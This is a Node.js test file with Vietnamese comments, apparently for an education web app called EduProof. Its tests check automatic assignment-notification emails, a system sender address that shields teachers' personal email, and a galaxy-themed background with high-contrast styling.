// --- TEST 58: Kiểm thử Tự động Gửi Email Thông báo Khi Tạo Bài Mới (Automated Background Email Dispatch) & Bỏ Modal Thủ công ---
const appJs58 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");
const sendEmailApiExists = fs.existsSync(path.join(__dirname, "api", "send-email.js"));
assert.ok(sendEmailApiExists, "Hệ thống phải có serverless function api/send-email.js cho triển khai Vercel");

// 1. Kiểm tra định nghĩa hàm gửi email ngầm autoDispatchAssignmentEmail
assert.ok(
  appJs58.includes("function autoDispatchAssignmentEmail") || appJs58.includes("async function autoDispatchAssignmentEmail"),
  "app.js phải có hàm autoDispatchAssignmentEmail để tự động gửi thông báo ngầm"
);

// 2. Kiểm tra trong confirmCreateAssignment: KHÔNG được gọi openBatchEmailModal làm phiền người dùng
assert.ok(
  !appJs58.includes("openBatchEmailModal(newAsg"),
  "confirmCreateAssignment tuyệt đối không được mở popup openBatchEmailModal bắt người dùng thao tác thủ công"
);
assert.ok(
  appJs58.includes("autoDispatchAssignmentEmail(newAsg, emailStudents)"),
  "confirmCreateAssignment phải tự động gọi autoDispatchAssignmentEmail khi có học sinh cài email"
);

// 3. Kiểm tra thông điệp xác nhận rõ ràng rằng hệ thống đã tự động gửi email
assert.ok(
  appJs58.includes("Hệ thống đã tự động gửi email thông báo bài tập mới đến"),
  "Thông báo thành công phải khẳng định hệ thống đã tự động gửi email, không cần thao tác gửi thủ công"
);

// 4. Kiểm thử chạy thử api/send-email.js
const sendEmailHandler = require(path.join(__dirname, "api", "send-email.js"));
let mockStatus = 0;
let mockResponseJson = null;
const mockRes = {
  setHeader: () => {},
  status: (code) => {
    mockStatus = code;
    return {
      json: (data) => { mockResponseJson = data; },
      end: () => {}
    };
  }
};
const mockReq = {
  method: "POST",
  body: {
    bcc: ["test_student@gmail.com"],
    subject: "[EduProof] Bài tập mới kiểm thử",
    text: "Nội dung bài tập",
    html: "<p>Nội dung</p>"
  }
};

sendEmailHandler(mockReq, mockRes).then(() => {
  assert.strictEqual(mockStatus, 200, "api/send-email.js phải trả về status 200");
  assert.strictEqual(mockResponseJson.success, true, "api/send-email.js phải phản hồi success: true");
});

console.log("✅ 58. Kiểm thử Tự động Gửi Email Thông báo Khi Tạo Bài Mới & Bỏ Popup Thủ công: ĐẠT");

// --- TEST 59: Kiểm thử Bảo mật Danh tính & Gửi Thư Qua Mail Ảo Hệ Thống (Virtual System Sender) ---
const appJs59 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");
const apiCode59 = fs.readFileSync(path.join(__dirname, "api", "send-email.js"), "utf8");
const html59 = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");

// 1. Kiểm tra cấu hình mail ảo trong api/send-email.js
assert.ok(
  apiCode59.includes("virtualSenderEmail") &&
  apiCode59.includes("thongbao@eduproof.vn") &&
  apiCode59.includes("fromField"),
  "api/send-email.js phải cấu hình người gửi là mail ảo hệ thống EduProof (thongbao@eduproof.vn) để bảo vệ danh tính giáo viên"
);

// 2. Kiểm tra confirmRejectPhotoSubmission không gọi window.open(gmailUrl) làm lộ tài khoản cá nhân
assert.ok(
  !appJs59.includes("window.open(gmailUrl"),
  "confirmRejectPhotoSubmission không được tự động mở cửa sổ Gmail cá nhân làm lộ email cá nhân của giáo viên"
);
assert.ok(
  appJs59.includes('fetch("/api/send-email"'),
  "app.js phải sử dụng fetch ngầm tới /api/send-email để gửi thư thông báo từ chối ảnh"
);

// 3. Kiểm tra ghi chú bảo mật trong index.html
assert.ok(
  html59.includes("Gửi qua mail ảo hệ thống (EduProof System Mail)"),
  "index.html phải có ghi chú rõ ràng về việc gửi qua mail ảo hệ thống để người dùng yên tâm"
);

// 4. Kiểm thử chạy thử api/send-email.js với tên giáo viên và định danh mail ảo
const sendEmailHandler59 = require(path.join(__dirname, "api", "send-email.js"));
let mockStatus59 = 0;
let mockResponseJson59 = null;
const mockRes59 = {
  setHeader: () => {},
  status: (code) => {
    mockStatus59 = code;
    return {
      json: (data) => { mockResponseJson59 = data; },
      end: () => {}
    };
  }
};
const mockReq59 = {
  method: "POST",
  body: {
    to: "hocsinh_nhantin@gmail.com",
    teacherName: "Cô Ngô Hà",
    subject: "[EduProof] Bài tập mới môn Hóa",
    text: "Nội dung bài tập",
    html: "<p>Nội dung</p>"
  }
};

sendEmailHandler59(mockReq59, mockRes59).then(() => {
  assert.strictEqual(mockStatus59, 200, "api/send-email.js phải trả về 200");
  assert.strictEqual(mockResponseJson59.success, true);
  assert.strictEqual(mockResponseJson59.virtualEmail, "thongbao@eduproof.vn");
  assert.ok(
    mockResponseJson59.sender.includes("Cô Ngô Hà (EduProof)") &&
    mockResponseJson59.sender.includes("thongbao@eduproof.vn"),
    "Người gửi hiển thị phải là Cô Ngô Hà (EduProof) kèm địa chỉ mail ảo hệ thống"
  );
});

console.log("✅ 59. Kiểm thử Bảo mật Danh tính & Gửi Thư Qua Mail Ảo Hệ Thống (Virtual System Sender): ĐẠT");

// --- TEST 60: Kiểm thử Nền Động Bầu Trời Galaxy & Khung/Chữ Tương Phản Cao ---
const css60 = fs.readFileSync(path.join(__dirname, "app.css"), "utf8");
const html60 = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");
const galaxyImageExists = fs.existsSync(path.join(__dirname, "galaxy-bg.jpg"));

// 1. Kiểm tra tồn tại tệp ảnh nền galaxy
assert.ok(galaxyImageExists, "Tệp galaxy-bg.jpg phải tồn tại trong thư mục dự án");

// 2. Kiểm tra HTML chứa đủ cấu trúc phân lớp thiên hà động
assert.ok(
  html60.includes('class="galaxy-universe"') &&
  html60.includes('class="galaxy-bg-image"') &&
  html60.includes('class="galaxy-nebula"') &&
  html60.includes('class="galaxy-stars-layer1"') &&
  html60.includes('class="galaxy-shooting-star"'),
  "index.html phải có đủ các lớp ảnh vũ trụ, tinh vân phát sáng, sao lấp lánh và sao băng chuyển động"
);

// 3. Kiểm tra CSS keyframes hiệu ứng bầu trời galaxy động
assert.ok(
  css60.includes("@keyframes galaxyDrift") &&
  css60.includes("@keyframes nebulaPulse") &&
  css60.includes("@keyframes starTwinkle") &&
  css60.includes("@keyframes shootingStar"),
  "app.css phải định nghĩa các keyframe galaxyDrift, nebulaPulse, starTwinkle, shootingStar"
);

// 4. Kiểm tra độ tương phản cao cho khung và chữ
assert.ok(
  css60.includes(".galaxy-universe") &&
  css60.includes("rgba(255, 255, 255, 0.97)") &&
  css60.includes(".view-title") &&
  css60.includes(".card-title"),
  "app.css phải thiết lập khung tương phản cao rgba(255,255,255,0.97) và chữ đậm nổi bật trên nền thiên hà"
);

console.log("✅ 60. Kiểm thử Nền Động Bầu Trời Galaxy & Khung/Chữ Tương Phản Cao: ĐẠT");

console.log("\n🎉 TẤT CẢ CÁC BÀI KIỂM THỬ ĐÃ VƯỢT QUA THÀNH CÔNG (60/60)!");
